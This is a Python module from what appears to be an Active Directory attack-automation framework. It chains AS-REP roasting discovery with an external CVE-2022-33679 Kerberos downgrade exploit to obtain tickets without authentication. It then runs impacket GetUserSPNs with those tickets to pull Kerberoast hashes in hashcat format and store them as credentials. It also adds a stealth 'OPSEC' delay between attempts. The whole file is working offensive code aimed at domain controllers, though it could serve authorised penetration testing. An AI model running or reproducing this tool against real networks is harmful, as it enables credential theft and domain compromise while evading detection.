#!/usr/bin/env python3
"""
CVE-2022-33679 Exploitation Module for AD-Automaton
Exploits Windows Kerberos encryption downgrade vulnerability for unauthenticated Kerberoasting.
Based on the field manual's advanced attack chain methodology.
"""

import os
import re
import time
import logging
import tempfile
from typing import List, Dict, Any, Optional, Tuple

import sys
sys.path.append(os.path.join(os.path.dirname(__file__), '..', 'lib'))

from database import DatabaseManager, Credential, User, Host, Vulnerability
from executor import CommandExecutor
from parsers import ImpacketParser
from logger import log_discovery, log_tool_execution, log_tool_result

class CVE202233679Exploiter:
    """
    Exploits CVE-2022-33679 to perform unauthenticated Kerberoasting.
    Chains AS-REP roasting prerequisite with encryption downgrade attack.
    """
    
    def __init__(self, db_manager: DatabaseManager, config: Dict[str, Any]):
        """
        Initialize the CVE-2022-33679 exploiter.
        
        Args:
            db_manager: Database manager instance
            config: Configuration dictionary
        """
        self.db_manager = db_manager
        self.config = config
        self.logger = logging.getLogger(__name__)
        self.executor = CommandExecutor()
        self.parser = ImpacketParser()
        
        # Get tool configurations
        self.exploit_config = config.get('tools', {}).get('cve_2022_33679', {})
        self.exploit_script_path = self.exploit_config.get('script_path', './exploits/cve-2022-33679.py')
        
        self.impacket_config = config.get('tools', {}).get('impacket', {})
        self.getuserspns_path = self.impacket_config.get('getuserspns_path', 'impacket-GetUserSPNs')
        
        # Feature flags
        self.enabled = config.get('features', {}).get('enable_cve_2022_33679', True)
        self.auto_kerberoast = config.get('features', {}).get('auto_kerberoast_after_exploit', True)
        
        # OPSEC settings
        self.opsec_profile = config.get('opsec_profile', 'normal')
        
        # Output directory
        self.output_dir = config.get('output', {}).get('cve_dir', '/tmp/ad-automaton-cve')
        os.makedirs(self.output_dir, exist_ok=True)
        
        # Constants
        self.DONT_REQ_PREAUTH_FLAG = 4194304  # Required prerequisite
    
    def run_cve_2022_33679_attack(self) -> Dict[str, Any]:
        """
        Main method to run CVE-2022-33679 exploitation attack.
        
        Returns:
            Dictionary containing attack results including TGTs and Kerberoast hashes
        """
        if not self.enabled:
            self.logger.info("CVE-2022-33679 exploitation is disabled in configuration")
            return {'tgts': [], 'kerberoast_hashes': [], 'vulnerable_users': []}
        
        self.logger.info("Starting CVE-2022-33679 exploitation attack")
        
        # Phase 1: Check prerequisites
        if not self._check_prerequisites():
            return {'tgts': [], 'kerberoast_hashes': [], 'vulnerable_users': []}
        
        # Phase 2: Identify vulnerable targets
        vulnerable_users = self._identify_vulnerable_users()
        
        if not vulnerable_users:
            self.logger.warning("No users with disabled pre-authentication found (prerequisite for CVE-2022-33679)")
            return {'tgts': [], 'kerberoast_hashes': [], 'vulnerable_users': []}
        
        # Phase 3: Exploit CVE-2022-33679 to get TGTs
        successful_tgts = self._exploit_vulnerable_users(vulnerable_users)
        
        # Phase 4: Use TGTs for authenticated Kerberoasting
        kerberoast_hashes = []
        if successful_tgts and self.auto_kerberoast:
            kerberoast_hashes = self._perform_authenticated_kerberoasting(successful_tgts)
        
        # Phase 5: Store results and create vulnerability records
        self._store_results(successful_tgts, kerberoast_hashes, vulnerable_users)
        
        results = {
            'tgts': successful_tgts,
            'kerberoast_hashes': kerberoast_hashes,
            'vulnerable_users': vulnerable_users
        }
        
        log_discovery("CVE-2022-33679 TGTs", len(successful_tgts))
        log_discovery("Unauthenticated Kerberoast hashes", len(kerberoast_hashes))
        
        return results
    
    def _check_prerequisites(self) -> bool:
        """
        Check if prerequisites for CVE-2022-33679 exploitation are met.
        
        Returns:
            True if prerequisites are satisfied, False otherwise
        """
        # Check if exploit script exists
        if not os.path.exists(self.exploit_script_path):
            self.logger.error(f"CVE-2022-33679 exploit script not found: {self.exploit_script_path}")
            self.logger.info("Please download the exploit from a trusted source and configure the path")
            return False
        
        # Check if we have domain controllers identified
        domain_controllers = self._get_domain_controllers()
        if not domain_controllers:
            self.logger.error("No domain controllers found - required for CVE-2022-33679 exploitation")
            return False
        
        # Check if we can determine domain name
        domain_name = self._get_domain_name()
        if not domain_name:
            self.logger.error("Could not determine domain name - required for exploitation")
            return False
        
        return True
    
    def _identify_vulnerable_users(self) -> List[str]:
        """
        Identify users vulnerable to CVE-2022-33679 (those with disabled pre-auth).
        
        Returns:
            List of usernames with DONT_REQ_PREAUTH flag set
        """
        self.logger.info("Identifying users vulnerable to CVE-2022-33679")
        
        # Reuse AS-REP roasting discovery logic
        from modules.asrep_roasting import ASREPRoaster
        
        asrep_roaster = ASREPRoaster(self.db_manager, self.config)
        vulnerable_users = asrep_roaster._discover_asrep_roastable_users()
        
        if vulnerable_users:
            self.logger.info(f"Found {len(vulnerable_users)} users with disabled pre-authentication")
            for user in vulnerable_users:
                self.logger.info(f"  - {user} (potential CVE-2022-33679 target)")
        else:
            self.logger.warning("No users with disabled pre-authentication found")
        
        return vulnerable_users
    
    def _exploit_vulnerable_users(self, vulnerable_users: List[str]) -> List[Dict[str, Any]]:
        """
        Exploit CVE-2022-33679 against vulnerable users to obtain TGTs.
        
        Args:
            vulnerable_users: List of usernames to exploit
            
        Returns:
            List of successful TGT acquisitions with metadata
        """
        successful_tgts = []
        
        domain_name = self._get_domain_name()
        domain_controllers = self._get_domain_controllers()
        target_dc = domain_controllers[0]
        
        self.logger.info(f"Attempting CVE-2022-33679 exploitation against {len(vulnerable_users)} users")
        
        for username in vulnerable_users:
            try:
                self.logger.info(f"Exploiting CVE-2022-33679 for user: {username}")
                
                tgt_result = self._execute_cve_exploit(username, domain_name, target_dc)
                
                if tgt_result:
                    successful_tgts.append(tgt_result)
                    self.logger.info(f"Successfully obtained TGT for {username}")
                else:
                    self.logger.warning(f"CVE-2022-33679 exploitation failed for {username}")
                
                # OPSEC delay between exploit attempts
                if self.opsec_profile == 'stealth':
                    delay = 30  # 30 second delay in stealth mode
                    self.logger.debug(f"OPSEC delay: waiting {delay} seconds")
                    time.sleep(delay)
            
            except Exception as e:
                self.logger.error(f"Error exploiting CVE-2022-33679 for {username}: {e}")
                continue
        
        return successful_tgts
    
    def _execute_cve_exploit(self, username: str, domain: str, dc_host: Host) -> Optional[Dict[str, Any]]:
        """
        Execute the CVE-2022-33679 exploit script against a specific user.
        
        Args:
            username: Target username
            domain: Domain name
            dc_host: Domain controller to target
            
        Returns:
            Dictionary with TGT information if successful, None otherwise
        """
        # Construct output files
        ccache_file = os.path.join(self.output_dir, f'{username}_{int(time.time())}.ccache')
        
        # Construct exploit command
        # Note: This is a generic template - actual exploit scripts may vary
        cmd_parts = [
            'python3',
            self.exploit_script_path,
            '--target', f'{username}@{domain}',
            '--dc-ip', dc_host.ip_address,
            '--output', ccache_file
        ]
        
        cmd = ' '.join(cmd_parts)
        
        try:
            log_tool_execution("CVE-2022-33679", f"CVE exploit for {username}")
            result = self.executor.execute_command(cmd, timeout=300)
            
            if result.returncode == 0:
                # Check if ccache file was created
                if os.path.exists(ccache_file):
                    log_tool_result("CVE-2022-33679", True)
                    
                    # Parse exploit output for session key and TGT info
                    tgt_info = self._parse_exploit_output(result.stdout, username, domain, ccache_file)
                    return tgt_info
                else:
                    self.logger.warning(f"Exploit succeeded but no ccache file created for {username}")
                    log_tool_result("CVE-2022-33679", False)
            else:
                self.logger.debug(f"CVE-2022-33679 exploit failed for {username}: {result.stderr}")
                log_tool_result("CVE-2022-33679", False)
        
        except Exception as e:
            self.logger.error(f"Error executing CVE-2022-33679 exploit: {e}")
        
        return None
    
    def _parse_exploit_output(self, output: str, username: str, domain: str, ccache_file: str) -> Dict[str, Any]:
        """
        Parse CVE-2022-33679 exploit output to extract TGT information.
        
        Args:
            output: Exploit script output
            username: Target username
            domain: Domain name
            ccache_file: Path to generated ccache file
            
        Returns:
            Dictionary with TGT metadata
        """
        tgt_info = {
            'username': username,
            'domain': domain,
            'ccache_file': ccache_file,
            'session_key': None,
            'tgt_extracted': True,
            'timestamp': int(time.time())
        }
        
        # Look for session key in output
        session_key_match = re.search(r'Session Key:\s*([a-fA-F0-9]+)', output)
        if session_key_match:
            tgt_info['session_key'] = session_key_match.group(1)
        
        # Look for additional exploitation details
        if 'Encryption downgrade successful' in output:
            tgt_info['downgrade_successful'] = True
        
        if 'Brute-force session key' in output:
            tgt_info['session_key_cracked'] = True
        
        return tgt_info
    
    def _perform_authenticated_kerberoasting(self, tgt_list: List[Dict[str, Any]]) -> List[Credential]:
        """
        Use obtained TGTs to perform authenticated Kerberoasting.
        
        Args:
            tgt_list: List of TGT information dictionaries
            
        Returns:
            List of Kerberoast hashes as credentials
        """
        kerberoast_hashes = []
        
        self.logger.info("Performing authenticated Kerberoasting with obtained TGTs")
        
        for tgt_info in tgt_list:
            try:
                hashes = self._kerberoast_with_tgt(tgt_info)
                kerberoast_hashes.extend(hashes)
            except Exception as e:
                self.logger.error(f"Error Kerberoasting with TGT for {tgt_info['username']}: {e}")
                continue
        
        return kerberoast_hashes
    
    def _kerberoast_with_tgt(self, tgt_info: Dict[str, Any]) -> List[Credential]:
        """
        Perform Kerberoasting using a specific TGT.
        
        Args:
            tgt_info: TGT information dictionary
            
        Returns:
            List of Kerberoast hashes
        """
        kerberoast_hashes = []
        
        domain_controllers = self._get_domain_controllers()
        if not domain_controllers:
            return []
        
        target_dc = domain_controllers[0]
        ccache_file = tgt_info['ccache_file']
        
        # Set environment variable for Kerberos ticket cache
        env = os.environ.copy()
        env['KRB5CCNAME'] = ccache_file
        
        # Step 1: Enumerate SPNs using the TGT
        spn_users = self._enumerate_spns_with_tgt(tgt_info, target_dc, env)
        
        if not spn_users:
            self.logger.warning(f"No SPNs found using TGT for {tgt_info['username']}")
            return []
        
        # Step 2: Request TGS tickets for each SPN
        for spn_user in spn_users:
            try:
                hash_cred = self._request_tgs_with_tgt(spn_user, tgt_info, target_dc, env)
                if hash_cred:
                    kerberoast_hashes.append(hash_cred)
            except Exception as e:
                self.logger.debug(f"Error requesting TGS for {spn_user}: {e}")
                continue
        
        return kerberoast_hashes
    
    def _enumerate_spns_with_tgt(self, tgt_info: Dict[str, Any], dc_host: Host, env: Dict[str, str]) -> List[str]:
        """
        Enumerate SPNs using the obtained TGT.
        
        Args:
            tgt_info: TGT information
            dc_host: Domain controller
            env: Environment variables with ccache set
            
        Returns:
            List of users with SPNs
        """
        spn_users = []
        
        # Use GetUserSPNs with Kerberos authentication
        cmd_parts = [
            self.getuserspns_path,
            '-k',  # Use Kerberos authentication
            '-no-pass',  # Don't prompt for password
            '-dc-ip', dc_host.ip_address,
            f"{tgt_info['domain']}/{tgt_info['username']}"
        ]
        
        cmd = ' '.join(cmd_parts)
        
        try:
            log_tool_execution("GetUserSPNs with TGT", f"Enumerating SPNs as {tgt_info['username']}")
            result = self.executor.execute_command(cmd, timeout=180, env=env)
            
            if result.returncode == 0:
                spn_users = self._parse_spn_enumeration_output(result.stdout)
                log_tool_result("GetUserSPNs with TGT", len(spn_users) > 0)
                self.logger.info(f"Found {len(spn_users)} kerberoastable users")
            else:
                self.logger.debug(f"SPN enumeration failed: {result.stderr}")
                log_tool_result("GetUserSPNs with TGT", False)
        
        except Exception as e:
            self.logger.error(f"Error enumerating SPNs with TGT: {e}")
        
        return spn_users
    
    def _request_tgs_with_tgt(self, spn_user: str, tgt_info: Dict[str, Any], dc_host: Host, env: Dict[str, str]) -> Optional[Credential]:
        """
        Request TGS ticket for a specific SPN user using the TGT.
        
        Args:
            spn_user: Username with SPN to target
            tgt_info: TGT information
            dc_host: Domain controller
            env: Environment variables
            
        Returns:
            Credential with Kerberoast hash if successful
        """
        # Request TGS ticket
        cmd_parts = [
            self.getuserspns_path,
            '-k',  # Use Kerberos authentication
            '-no-pass',  # Don't prompt for password
            '-request',  # Request TGS tickets
            '-format', 'hashcat',
            '-dc-ip', dc_host.ip_address,
            f"{tgt_info['domain']}/{tgt_info['username']}"
        ]
        
        cmd = ' '.join(cmd_parts)
        
        try:
            log_tool_execution("GetUserSPNs TGS request", f"Requesting TGS for {spn_user}")
            result = self.executor.execute_command(cmd, timeout=120, env=env)
            
            if result.returncode == 0:
                # Parse TGS hash from output
                hash_cred = self._parse_tgs_hash_output(result.stdout, spn_user, tgt_info['domain'])
                if hash_cred:
                    log_tool_result("GetUserSPNs TGS request", True)
                    return hash_cred
                else:
                    log_tool_result("GetUserSPNs TGS request", False)
            else:
                self.logger.debug(f"TGS request failed for {spn_user}: {result.stderr}")
                log_tool_result("GetUserSPNs TGS request", False)
        
        except Exception as e:
            self.logger.error(f"Error requesting TGS for {spn_user}: {e}")
        
        return None
    
    def _parse_spn_enumeration_output(self, output: str) -> List[str]:
        """Parse GetUserSPNs enumeration output for usernames."""
        spn_users = []
        
        # Look for lines containing servicePrincipalName
        lines = output.split('\n')
        current_user = None
        
        for line in lines:
            line = line.strip()
            
            # Look for samaccountname
            if line.startswith('sAMAccountName'):
                current_user = line.split()[-1]
            
            # Look for servicePrincipalName
            elif line.startswith('servicePrincipalName') and current_user:
                if current_user not in spn_users:
                    spn_users.append(current_user)
        
        return spn_users
    
    def _parse_tgs_hash_output(self, output: str, username: str, domain: str) -> Optional[Credential]:
        """Parse GetUserSPNs TGS output for Kerberoast hash."""
        # Look for hashcat format hash
        hash_pattern = r'\$krb5tgs\$23\$[^$]*\$[a-f0-9]+\$[a-f0-9]+'
        
        match = re.search(hash_pattern, output)
        if match:
            full_hash = match.group(0)
            
            credential = Credential(
                username=username,
                domain=domain,
                hash_value=full_hash,
                hash_type='Kerberos-TGS',
                source_tool='cve_2022_33679_kerberoast'
            )
            
            self.logger.info(f"Extracted Kerberoast hash for {domain}\\{username} via CVE-2022-33679")
            return credential
        
        return None
    
    def _store_results(self, tgts: List[Dict[str, Any]], kerberoast_hashes: List[Credential], vulnerable_users: List[str]) -> None:
        """
        Store results and create vulnerability records.
        
        Args:
            tgts: List of obtained TGTs
            kerberoast_hashes: List of Kerberoast credentials
            vulnerable_users: List of vulnerable usernames
        """
        # Store Kerberoast hashes as credentials
        for cred in kerberoast_hashes:
            try:
                self.db_manager.add_credential(cred)
            except Exception as e:
                self.logger.error(f"Error storing Kerberoast credential: {e}")
        
        # Create TGT credentials for obtained tickets
        for tgt_info in tgts:
            try:
                tgt_credential = Credential(
                    username=tgt_info['username'],
                    domain=tgt_info['domain'],
                    hash_value=f"TGT_via_CVE-2022-33679:{tgt_info['ccache_file']}",
                    hash_type='TGT',
                    source_tool='cve_2022_33679'
                )
                self.db_manager.add_credential(tgt_credential)
            except Exception as e:
                self.logger.error(f"Error storing TGT credential: {e}")
        
        # Create vulnerability records
        self._create_vulnerability_records(vulnerable_users, len(tgts) > 0)
    
    def _create_vulnerability_records(self, vulnerable_users: List[str], exploitation_successful: bool) -> None:
        """Create vulnerability records for CVE-2022-33679."""
        domain_controllers = self._get_domain_controllers()
        
        if not domain_controllers:
            return
        
        target_dc = domain_controllers[0]
        
        # Create general CVE vulnerability record
        try:
            cve_vulnerability = Vulnerability(
                host_id=target_dc.host_id,
                vuln_name="CVE-2022-33679",
                description=f"Windows Kerberos encryption downgrade vulnerability allowing unauthenticated Kerberoasting. Exploitation {'successful' if exploitation_successful else 'attempted'} against {len(vulnerable_users)} users with disabled pre-authentication.",
                cve="CVE-2022-33679",
                source_tool="cve_2022_33679"
            )
            
            self.db_manager.add_vulnerability(cve_vulnerability)
            self.logger.info("Created CVE-2022-33679 vulnerability record")
        
        except Exception as e:
            self.logger.error(f"Error creating CVE vulnerability record: {e}")
        
        # Create records for each vulnerable user
        for username in vulnerable_users:
            try:
                user_vulnerability = Vulnerability(
                    host_id=target_dc.host_id,
                    vuln_name="CVE-2022-33679 Target",
                    description=f"User '{username}' vulnerable to CVE-2022-33679 due to disabled Kerberos pre-authentication, enabling unauthenticated TGT acquisition",
                    cve="CVE-2022-33679",
                    source_tool="cve_2022_33679"
                )
                
                self.db_manager.add_vulnerability(user_vulnerability)
            
            except Exception as e:
                self.logger.error(f"Error creating user vulnerability record for {username}: {e}")
    
    def _get_domain_controllers(self) -> List[Host]:
        """Get domain controllers from the database."""
        query = "SELECT * FROM Hosts WHERE is_dc = 1"
        rows = self.db_manager.execute_query(query)
        
        hosts = []
        for row in rows:
            host = Host(
                host_id=row[0],
                ip_address=row[1],
                hostname=row[2],
                os=row[3],
                is_dc=bool(row[4]),
                smb_signing=row[5]
            )
            hosts.append(host)
        
        return hosts
    
    def _get_domain_name(self) -> Optional[str]:
        """Extract domain name from database or configuration."""
        # Try to get from existing credentials
        query = "SELECT DISTINCT domain FROM Credentials WHERE domain IS NOT NULL LIMIT 1"
        rows = self.db_manager.execute_query(query)
        
        if rows:
            return rows[0]['domain']
        
        # Try to get from users
        query = "SELECT DISTINCT domain FROM Users WHERE domain IS NOT NULL LIMIT 1"
        rows = self.db_manager.execute_query(query)
        
        if rows:
            return rows[0]['domain']
        
        # Fall back to configuration
        return self.config.get('target', {}).get('domain')


def run_cve_2022_33679_attack(db_manager: DatabaseManager, config: Dict[str, Any]) -> Dict[str, Any]:
    """
    Main entry point for CVE-2022-33679 exploitation module.
    
    Args:
        db_manager: Database manager instance
        config: Configuration dictionary
        
    Returns:
        Dictionary containing attack results
    """
    exploiter = CVE202233679Exploiter(db_manager, config)
    return exploiter.run_cve_2022_33679_attack() 